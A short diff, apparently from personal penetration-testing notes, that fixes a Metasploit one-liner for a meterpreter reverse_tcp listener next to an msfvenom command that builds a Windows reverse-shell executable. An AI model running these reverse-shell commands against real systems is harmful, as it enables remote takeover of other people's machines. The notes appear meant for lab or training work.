@@ -10,7 +10,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=${PORT} -f exe -o she
 
 One-liner for setting up a listener
 ```
-sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT "6666'; exploit"
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"
 
 ```
 ## encoding
